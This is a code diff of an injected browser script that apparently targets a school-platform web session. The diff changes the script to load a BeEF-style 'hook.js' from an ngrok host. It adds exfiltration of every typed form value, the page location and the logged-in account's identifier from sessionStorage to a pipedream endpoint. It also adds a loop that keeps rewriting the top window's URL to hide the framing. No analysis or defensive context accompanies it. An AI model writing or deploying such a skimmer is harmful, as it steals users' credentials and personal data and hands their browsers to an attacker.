@@ -4,7 +4,7 @@ const ur = new URL(document.currentScript.src);
 
 	if (window.top.document.querySelector('form[class=EDsploit]')) return;
 	await payload();
-	
+
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
 		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
@@ -62,7 +62,7 @@ async function payload() {
 			if (!doc) return;
 
 			const beef = doc.createElement('script');
-			beef.src = 'https://exon-dv.github.io/a/b.js';
+			beef.src = ' https://thee-slobbery-jailer.ngrok-free.dev/hook.js';
 			beef.async = true;
 			doc.body.appendChild(beef);
 
@@ -77,8 +77,10 @@ async function payload() {
 
 					field.addEventListener('input', async function() {
 					const data = { 
-						name: this.name || this.id || this.type || this.className || 'field',
-						value: this.value || this.innerText
+						input: this.name || this.id || this.type || this.className || 'field',
+						value: this.value || this.innerText,
+						location: window.location,
+						name: JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].identifiant
 					};
 					await fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
 						method: "POST",
@@ -93,6 +95,11 @@ async function payload() {
 			const observer = new MutationObserver(() => attachListeners(doc));
 			observer.observe(doc.body, { childList: true, subtree: true });
 			attachListeners(doc);
+			setInterval(() => {
+				if (window.top.location.href !== window.location.href) {
+					window.top.history.replaceState({}, '', window.location.href);
+				}
+			}, 500);
 
 		} catch (err) {
 			console.error('iframe hook failed', err);
